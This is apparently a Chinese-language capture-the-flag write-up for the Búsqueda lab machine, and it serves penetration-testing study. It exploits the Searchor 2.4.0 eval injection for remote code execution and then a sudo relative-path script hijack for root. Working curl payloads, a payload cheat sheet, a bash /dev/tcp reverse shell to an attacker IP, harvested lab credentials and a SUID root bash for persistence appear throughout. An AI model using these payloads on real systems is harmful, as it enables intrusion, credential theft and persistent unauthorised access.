---
Status: "#Rooted"
OS: Linux (Ubuntu 22.04)
ip: 10.129.228.217
Start_Time: 2026-05-06 14:30
---
---

## 📋 1. Attack Summary
靶机 Búsqueda 是一台基于 Flask + Apache 反向代理的 Linux Web 主机，前端是一个调用 [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor) 库的搜索聚合页。Searchor 2.4.0 在 `/search` 端点中将用户提交的 `query` 参数直接拼入 f-string 后调用 `eval()`（**CVE-2023-43364**），可以通过闭合单引号注入任意 Python 表达式实现 RCE。利用 Python `and` 短路求值，让注入表达式的返回值成为 `eval` 的最终结果，借此把命令输出反射到 HTTP 响应体里，无需带外通道即可读取 `/home/svc/user.txt`，落地用户 `svc` (uid=1000)。

提权阶段从 `/var/www/app/.git/config` 抠出 Gitea 凭据 `cody:jh1usoih2bkjaspwe92`，密码复用即 svc 系统账号密码。`sudo -l` 给出 `(root) /usr/bin/python3 /opt/scripts/system-checkup.py *`。审计脚本源码（用 `docker-inspect` 旁路读出）发现 `full-checkup` 子命令调用相对路径 `./full-checkup.sh`，在 svc 可写的工作目录里植入同名脚本即被 root 执行，落地 root。



---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning

```bash
# 全端口快扫
nmap -Pn -T4 --min-rate 1000 -p- 10.129.228.217 -oN nmap_full.txt

# 版本侦测 + 默认脚本
nmap -sV -sC -Pn -p 22,80 10.129.228.217 -oN nmap_sv.txt
```

**Nmap 输出：**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
```

**关键观察：**
- 仅暴露 22 和 80 端口
- Apache 反向代理 Flask（Werkzeug 2.1.2 / Python 3.10.6）
- `http-title: Searcher`，反向解析得到 vhost `searcher.htb`

### 2.2 Hosts 配置

```bash
echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
```

### 2.3 Web 指纹

```bash
curl -s http://searcher.htb/ | tail -40
```

页脚直接暴露技术栈：
```html
<p class="copyright">Powered by
  <a href="https://flask.palletsprojects.com">Flask</a> and
  <a href="https://github.com/ArjunSharda/Searchor">Searchor 2.4.0</a>
</p>
```

主页表单：
```html
<form action="/search" method="post">
  <select name="engine"> <!-- 大量预定义引擎 --> </select>
  <input name="query" type="text">
  <input name="auto_redirect" type="checkbox">
</form>
```

提交一个正常请求确认行为：
```bash
curl -s -i -X POST http://searcher.htb/search -d "engine=Bing&query=hello"
```
```
HTTP/1.1 200 OK
Content-Length: 35

https://www.bing.com/search?q=hello
```

→ 响应体直接是 Searchor 内部 `Engine.<x>.search(...)` 调用的返回值（URL 字符串）。这意味着如果我们能控制这次调用的返回值，输出就会被反射到响应里。

---

## 3. Vulnerability Identification & Foothold

### 3.1 Vulnerability Discovery

- **Vulnerability Name:** Searchor 2.4.0 — Arbitrary Code Execution via `eval()`
- **CVE Reference:** [CVE-2023-43364](https://nvd.nist.gov/vuln/detail/CVE-2023-43364)
- **Research/Resources:**
  - https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2
  - https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
- **Discovery Logic:**
  Searchor ≤ 2.4.0 的 `search` 函数大致如下：
  ```python
  url = eval(
      f"Engine.{engine}.search('{query}', copy_url=copy, open_web=open)"
  )
  ```
  `query` 被 f-string 拼接后再 `eval()`，因此用户输入里的任何单引号都会闭合掉外层字符串，剩余部分作为 Python 表达式被解释执行。

### 3.2 Initial Access (Exploitation)

#### Step 1 — 时序验证 RCE
用 `os.system("sleep 5")` 确认代码确实被执行（即使响应空，从耗时也能判断）：

```bash
time curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://searcher.htb/search \
  --data-urlencode "engine=Bing" \
  --data-urlencode 'query=x'"'"', __import__("os").system("sleep 5"), '"'"''
```

**结果：** HTTP 200，耗时 **5.23s** ✅

eval 实际执行的代码：
```python
Engine.Bing.search('x', __import__("os").system("sleep 5"), '', copy_url=copy, open_web=open)
```

#### Step 2 — 把响应变成命令输出（核心技巧）

利用 Python `and` 的短路求值：
- `truthy_string and X` → 返回 `X`
- `Engine.Bing.search('x')` 返回非空 URL 字符串（真）
- 用 `#` 注释掉 f-string 后半段的剩余原代码

**注入后的 query：**
```
x') and __import__("os").popen("CMD").read() #
```

**eval 实际执行的表达式：**
```python
Engine.Bing.search('x') and __import__("os").popen("CMD").read() #', copy_url=copy, open_web=open)
```

整个表达式的值 = `popen().read()` = 命令的 stdout，被 Flask 直接返回到响应体中。

#### Step 3 — 信息收集

```bash
curl -s -X POST http://searcher.htb/search \
  --data-urlencode "engine=Bing" \
  --data-urlencode 'query=x'"'"') and __import__("os").popen("id; hostname; ls /home; pwd").read() #'
```

**输出：**
```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
busqueda
svc
/var/www/app
```

→ 当前用户 `svc`，主机名 `busqueda`，应用目录 `/var/www/app`。

#### Step 4 — 抓取 user.txt

```bash
curl -s -X POST http://searcher.htb/search \
  --data-urlencode "engine=Bing" \
  --data-urlencode 'query=x'"'"') and __import__("os").popen("cat /home/svc/user.txt; ls -la /home/svc").read() #'
```

**输出：**
```
9335ff9ebe39df02964d2a03475387b4
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3  2023 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 May  6 18:00 user.txt
```

> 注意 `.bash_history` / `.mysql_history` / `.searchor-history.json` 全部软链到 `/dev/null` — 出题人主动防止留痕，提醒后续提权别依赖历史文件。

#### 触发反弹 shell 的最终 Payload（备选，本次未用到）

```bash
# 在 Kali 上：nc -lnvp 4444
curl -s -X POST http://searcher.htb/search \
  --data-urlencode "engine=Bing" \
  --data-urlencode 'query=x'"'"', __import__("os").system("bash -c '"'"'bash -i >& /dev/tcp/10.10.15.46/4444 0>&1'"'"'"), '"'"''
```

> ⚠️ `os.system` 默认通过 `/bin/sh` 执行，Ubuntu 上 `/bin/sh` → `dash`，`dash` 不支持 `/dev/tcp`，所以必须用 `bash -c "..."` 包一层。

#### Payload 速查表

| 用途 | query 参数（裸字符串） |
|------|----------------------|
| 时序 RCE 验证 | `x', __import__("os").system("sleep 5"), '` |
| 带回显执行任意命令 | `x') and __import__("os").popen("CMD").read() #` |
| 反弹 shell（dash 兼容写法） | `x', __import__("os").system("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"), '` |

#### 通用 curl 模板

```bash
TARGET=http://searcher.htb/search
CMD='id'
curl -s -X POST "$TARGET" \
  --data-urlencode "engine=Bing" \
  --data-urlencode "query=x') and __import__(\"os\").popen(\"$CMD\").read() #"
```

命令含特殊字符时改用 base64：
```bash
B64=$(echo -n 'cat /etc/passwd | grep sh$' | base64 -w0)
curl -s -X POST "$TARGET" \
  --data-urlencode "engine=Bing" \
  --data-urlencode "query=x') and __import__(\"os\").popen(\"echo $B64|base64 -d|bash\").read() #"
```

---

##  4. Privilege Escalation

### 4.1 Local Enumeration

通过 Step 6 节里的反射式 RCE 通道（仍以 `www-data`-绑定的 svc 进程身份运行）拿到 `/home/svc/.gitconfig`、`/var/www/app/.git/config`、`/var/www/app/app.py`、监听端口列表。

**`/home/svc/.gitconfig`：**
```ini
[user]
    email = cody@searcher.htb
    name = cody
[core]
    hooksPath = no-hooks
```

**`/var/www/app/.git/config`（关键凭据 ✦）：**
```ini
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

**`/var/www/app/app.py`（确认真正注入位置）：**
```python
from searchor import Engine
import subprocess

@app.route('/search', methods=['POST'])
def search():
    engine = request.form.get('engine')
    query = request.form.get('query')
    if engine in Engine.__members__.keys():
        arg_list = ['searchor', 'search', engine, query]
        r = subprocess.run(arg_list, capture_output=True)
        url = r.stdout.strip().decode()
        return url
```

→ Flask 调用 `searchor` CLI 子进程；`eval()` 在 Searchor CLI 内部，所以注入是经 `searchor` CLI → `eval()` → Flask 回显 stdout。

**监听端口：**
```
127.0.0.1:5000   Flask
127.0.0.1:3306   MySQL (docker mysql_db)
127.0.0.1:3000   Gitea HTTP (docker gitea)
127.0.0.1:222    Gitea SSH
0.0.0.0:80       Apache
0.0.0.0:22       OpenSSH
```

**SSH 复用密码登入 svc：**
```bash
ssh svc@10.129.228.217   # password: jh1usoih2bkjaspwe92
```

**`sudo -l`：**
```
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

`/opt/scripts/` 文件清单（脚本本身 mode 711，不可读，仅可执行）：
```
-rwx--x--x 1 root root  586 check-ports.py
-rwx--x--x 1 root root  857 full-checkup.sh
-rwx--x--x 1 root root 3346 install-flask.sh
-rwx--x--x 1 root root 1903 system-checkup.py
drwxr-x--- 8 root root      .git
```

### 4.2 Escalation Path

- **Vulnerability identified:** Wildcard sudoers + 受信脚本调用 **CWD 相对路径** 子脚本（`./full-checkup.sh`）
- **Exploitation Strategy:** 在 svc 可写目录里放置同名 `full-checkup.sh`，通过 `sudo system-checkup.py full-checkup` 让 root 执行该脚本

#### Step 1 — 探测脚本子命令

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py help
```
```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

#### Step 2 —（侧信息）用 `docker-inspect` 读 Gitea 容器环境

`system-checkup.py docker-inspect <go-template> <container>` 把模板透传给 `docker inspect --format`，可以拉容器全字段：

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config.Env}}' gitea
```
```
["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql",
 "GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea",
 "GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
 "PATH=...","USER=git","GITEA_CUSTOM=/data/gitea"]
```

得到 Gitea DB 密码 `yuiu1hoiu4i5ho1uh`（提权不强依赖此项，作为侧信道资料留档）。

#### Step 3 — 通过 Gitea API 列举仓库 / 用户

```bash
AUTH=$(echo -n 'cody:jh1usoih2bkjaspwe92' | base64)
curl -s -H "Authorization: Basic $AUTH" http://127.0.0.1:3000/api/v1/users/search?q=
# → administrator (id=1) 与 cody (id=2)
curl -s -H "Authorization: Basic $AUTH" http://127.0.0.1:3000/api/v1/users/administrator/repos
# → []  (administrator 无公开仓库；scripts 仓库为私有)
```

→ 走 Gitea web 攻陷 administrator 这条路被堵住，回到 sudo 脚本本身。

#### Step 4 — 反向工程 `system-checkup.py`（关键）

以"踩点 + 失败重试"方式定位漏洞：在 `/home/svc` 直接 `full-checkup` 报 `Something went wrong` —— 提示脚本依赖 CWD。植入恶意脚本前先确认源码：

```bash
cd /tmp/exploit
cat > full-checkup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/exploit/rbash
chmod 4755 /tmp/exploit/rbash
EOF
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup    # → [+] Done!
/tmp/exploit/rbash -p -c 'cat /opt/scripts/system-checkup.py'
```

源码关键片段：
```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']     # ← 相对路径！CWD 由调用者决定
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
```

#### Step 5 — 植入恶意脚本拿 root（最终 Payload）

```bash
mkdir -p /tmp/exploit && cd /tmp/exploit
cat > full-checkup.sh <<'EOF'
#!/bin/bash
id > /tmp/exploit/whoami.out
cat /root/root.txt > /tmp/exploit/root.txt
cp /bin/bash /tmp/exploit/rbash && chmod 4755 /tmp/exploit/rbash   # SUID root bash 持久化
EOF
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

```bash
$ ls -la /tmp/exploit/
-rwsr-xr-x 1 root root 1396520 May  6 20:34 rbash      ← SUID root
-rw-r--r-- 1 root root      33 May  6 20:34 root.txt
-rw-r--r-- 1 root root      39 May  6 20:34 whoami.out

$ cat whoami.out
uid=0(root) gid=0(root) groups=0(root)

$ /tmp/exploit/rbash -p
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
```

```bash
# Final command to elevate to root
mkdir -p /tmp/x && cd /tmp/x && \
printf '#!/bin/bash\ncp /bin/bash /tmp/x/rbash && chmod 4755 /tmp/x/rbash\n' > full-checkup.sh && \
chmod +x full-checkup.sh && \
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup && \
/tmp/x/rbash -p
```

---

## 🏁 5. Post-Exploitation
### 5.1 Evidence Collection
- **History Files:** `.bash_history` / `.mysql_history` / `.searchor-history.json` 均软链到 `/dev/null`，无可用历史。
- **Stored Credentials**:
  - Linux/Gitea：`cody : jh1usoih2bkjaspwe92`（亦为 svc 系统密码）
  - Gitea MySQL DB：`gitea : yuiu1hoiu4i5ho1uh`
- **Installed Apps:** Searchor 2.4.0 (Python lib，CVE-2023-43364)，Gitea (docker, 127.0.0.1:3000)，MySQL 8 (docker, 127.0.0.1:3306)，Apache 2.4.52，Flask + Werkzeug 2.1.2。
- **Persistent Root Access**: SUID root bash at `/tmp/exploit/rbash` — `rbash -p` 立刻拿到 euid=0。

### 5.2 凭据复用图谱
```
.git/config (cody:jh1usoih2bkjaspwe92)
        │
        ├─► Gitea web/API 登录（普通用户权限）
        └─► SSH svc@busqueda（密码复用）
              │
              └─► sudo system-checkup.py full-checkup
                       │ ./full-checkup.sh (CWD)
                       └─► root

---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash)                | Screenshot (Link)   |
| :------------ | :--------------------------------- | :------------------ |
| **user.txt**  | `9335ff9ebe39df02964d2a03475387b4` | ![](<user_flag.png>)  |
| **root.txt**  | `40a4d1e6d76e11dd9bc25e667ceb36d4` | ![](<root_flag.png>)  |
